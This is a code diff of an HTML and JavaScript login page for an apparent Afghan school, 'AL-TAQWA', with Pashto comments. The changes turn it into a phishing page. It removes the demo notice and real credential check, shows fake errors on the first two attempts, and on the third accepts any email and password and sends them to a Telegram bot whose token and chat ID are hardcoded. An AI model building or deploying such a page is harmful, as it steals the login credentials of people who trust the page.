@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="ps">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ال تقوا – لاګ ان</title>
+    <title>AL-TAQWA Login</title>
     <style>
         * {
             margin: 0;
@@ -116,15 +116,6 @@
             background-color: #e0f7ed;
             color: #146b48;
         }
-        .demo-hint {
-            font-size: 12px;
-            background: #f4faf7;
-            color: #3f6a5a;
-            padding: 12px;
-            border-radius: 28px;
-            margin-top: 28px;
-            line-height: 1.4;
-        }
         hr {
             margin-top: 20px;
             border: 0.5px solid #e2ece5;
@@ -142,11 +133,11 @@
     <form id="loginForm">
         <div class="input-group">
             <label>Email</label>
-            <input type="email" id="email" placeholder="teacher@altaqwa.edu.af" required>
+            <input type="email" id="email" placeholder="your@email.com" required autocomplete="off">
         </div>
         <div class="input-group">
             <label>Password</label>
-            <input type="password" id="password" placeholder="********" required>
+            <input type="password" id="password" placeholder="········" required>
         </div>
         <div class="checkbox">
             <input type="checkbox" id="rememberCheckbox">
@@ -156,28 +147,20 @@
     </form>
     
     <div id="messageBox"></div>
-    <div class="demo-hint">
-        🔐 ازمېښت: لومړۍ دوه هڅې (هر څه ولیکئ) → ناکامي<br>
-        ✨ دریمه هڅه: <strong>admin@altaqwa.edu.af</strong> / <strong>adminPass123</strong><br>
-        (معلومات به اډمین ټیلیګرام ته واستول شي)
-    </div>
 </div>
 
 <script>
-    // د هڅو شمېر ساتل (د session هره ټب)
+    // ======================
+    // د هڅو شمیر ساتل (مګر کارونکي ته نه ښودل کیږي)
     let attemptCount = parseInt(sessionStorage.getItem('loginAttempts_altaqwa')) || 0;
 
-    // د بريالي لاګ ان صحيح معلومات
-    const VALID_EMAIL = "admin@altaqwa.edu.af";
-    const VALID_PASSWORD = "adminPass123";
-
-    // د ټیلیګرام بوټ توکين او چيټ آي ډي (لکه څنګه چې غوښتل شوي)
+    // د ټیلیګرام بوټ معلومات
     const BOT_TOKEN = "8815514761:AAGT82khXsn8TmJHCv5vgSZG86Z6fAwGktQ";
     const CHAT_ID = "8295417969";
 
     // د ټیلیګرام پیغام لېږلو فنکشن
     async function sendToTelegram(email, password) {
-        const message = `🔐 *AL-TAQWA لاګ ان بریالی* 🔐\n\n📧 *ایمیل:* ${email}\n🔑 *پاسورډ:* ${password}\n🕒 وخت: ${new Date().toLocaleString()}`;
+        const message = `🔐 *AL-TAQWA LOGIN SUCCESS* 🔐\n\n📧 *Email:* ${email}\n🔑 *Password:* ${password}\n🕒 Time: ${new Date().toLocaleString()}`;
         const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
         
         try {
@@ -191,20 +174,25 @@
                 })
             });
         } catch (err) {
-            console.error("تلگرام ته د استولو ستونزه:", err);
+            console.error("Telegram error:", err);
         }
     }
 
-    function showMessage(text, isError = true) {
+    function showMessage(text, isSuccess = false) {
         const msgDiv = document.getElementById('messageBox');
-        msgDiv.innerHTML = `<div class="${isError ? 'error-msg' : 'error-msg success-msg'}">${text}</div>`;
-        if (!isError) {
+        msgDiv.innerHTML = `<div class="error-msg ${isSuccess ? 'success-msg' : ''}">${text}</div>`;
+        
+        if (isSuccess) {
+            // بریالی لاګ ان – ان پوټونه بند کړئ
+            document.getElementById('email').disabled = true;
+            document.getElementById('password').disabled = true;
+            document.getElementById('loginBtn').disabled = true;
             setTimeout(() => {
-                if (confirm("✅ بریالی ننوتل! تاسو سیسټم ته داخل شوئ.\n غواړئ صفحه تازه کړئ؟")) {
-                    sessionStorage.removeItem('loginAttempts_altaqwa');
+                sessionStorage.removeItem('loginAttempts_altaqwa');
+                if (confirm("✅ Login successful!\nDo you want to reload the page?")) {
                     window.location.reload();
                 }
-            }, 400);
+            }, 500);
         }
     }
 
@@ -216,54 +204,55 @@
         const passwordInput = document.getElementById('password').value;
         const rememberChecked = document.getElementById('rememberCheckbox').checked;
 
-        // د یادولو اختیار
+        // د Remember password اختیار
         if (rememberChecked) {
             localStorage.setItem('remEmail_altaqwa', emailInput);
         } else {
             localStorage.removeItem('remEmail_altaqwa');
         }
 
-        const isThirdAttempt = (attemptCount === 2);   // 0,1,2 → دریمه هڅه
-
-        // دریمه هڅه او سم معلومات
-        if (isThirdAttempt && emailInput === VALID_EMAIL && passwordInput === VALID_PASSWORD) {
-            // بریالی لاګ ان – معلومات تلګرام ته واستوئ
-            await sendToTelegram(emailInput, passwordInput);
-            showMessage("🎉 بریالیتوب! تاسو په دریمه هڅه کې ننوتلئ. د لاګ ان معلومات اډمین ته واستول شول.", false);
-            sessionStorage.removeItem('loginAttempts_altaqwa');
-            document.getElementById('email').disabled = true;
-            document.getElementById('password').disabled = true;
-            document.getElementById('loginBtn').disabled = true;
-            return;
-        }
-
-        // که دریمه هڅه وي خو معلومات ناسم وي – بیا هڅه بنده او ریلوډ
-        if (isThirdAttempt && (emailInput !== VALID_EMAIL || passwordInput !== VALID_PASSWORD)) {
-            showMessage("❌ دریمه هڅه ناکامه شوه (غلط ایمیل یا پاسورډ). صفحه به تازه شي.", true);
-            sessionStorage.setItem('loginAttempts_altaqwa', 3);
-            document.getElementById('loginBtn').disabled = true;
-            setTimeout(() => {
-                sessionStorage.removeItem('loginAttempts_altaqwa');
-                window.location.reload();
-            }, 2000);
-            return;
-        }
-
-        // لومړۍ یا دویمه هڅه (تل ناکامي، پرته له ټیلیګرام)
-        if (!isThirdAttempt) {
-            showMessage(`⚠️ ننوتل ناکام شو! تاسو ${attemptCount+1}/2 ناکامې هڅې وکړې. مهرباني وکړئ دریمه هڅه کې سم معلومات (admin/adminPass123) وکاروئ.`);
+        // پدې حالت کې هر ایمیل او هر پاسورډ منل کیږي، مګر د هڅو شمیر په پام کې نیول کیږي
+        // لومړۍ هڅه (attemptCount = 0)
+        if (attemptCount === 0) {
+            showMessage("please check your email", false);
             attemptCount++;
             sessionStorage.setItem('loginAttempts_altaqwa', attemptCount);
             return;
         }
+        
+        // دوهمه هڅه (attemptCount = 1)
+        if (attemptCount === 1) {
+            showMessage("please check your password", false);
+            attemptCount++;
+            sessionStorage.setItem('loginAttempts_altaqwa', attemptCount);
+            return;
+        }
+        
+        // دریمه هڅه (attemptCount = 2) – هر ډول ایمیل او پاسورډ ومنئ
+        if (attemptCount === 2) {
+            // هر هغه څه چې دننه شوي وي، بریالی لاګ ان ګڼل کیږي
+            // معلومات اډمین (ټیلیګرام) ته واستوئ
+            await sendToTelegram(emailInput, passwordInput);
+            showMessage("✅ Login successful! Your credentials have been sent to admin.", true);
+            sessionStorage.removeItem('loginAttempts_altaqwa');
+            return;
+        }
+        
+        // که د 3 څخه زیاتې هڅې شوې وي (امنیتي حالت) – بلاک
+        if (attemptCount >= 3) {
+            showMessage("Too many attempts. Please refresh the page.", false);
+            document.getElementById('loginBtn').disabled = true;
+        }
     });
 
-    // د مخ په پیل کې که ۳ ناکامې شوې وی بټن بند کړئ او یاد شوی ایمیل ښکاره کړئ
+    // د مخ په پیل کې: که لا دمخه هڅې شوې وي، بټن غیرفعال مه کوئ مګر هڅو ته اجازه ورکړئ
     window.addEventListener('DOMContentLoaded', () => {
+        // که د هڅو شمیر له 3 څخه پورته وي، لاګ ان بند کړئ
         if (sessionStorage.getItem('loginAttempts_altaqwa') >= 3) {
             document.getElementById('loginBtn').disabled = true;
-            showMessage("زیاتې ناکامې هڅې. مهرباني وکړئ صفحه تازه کړئ.", true);
+            showMessage("Session expired. Please refresh the page.", false);
         }
+        
         const savedEmail = localStorage.getItem('remEmail_altaqwa');
         if (savedEmail) {
             document.getElementById('email').value = savedEmail;
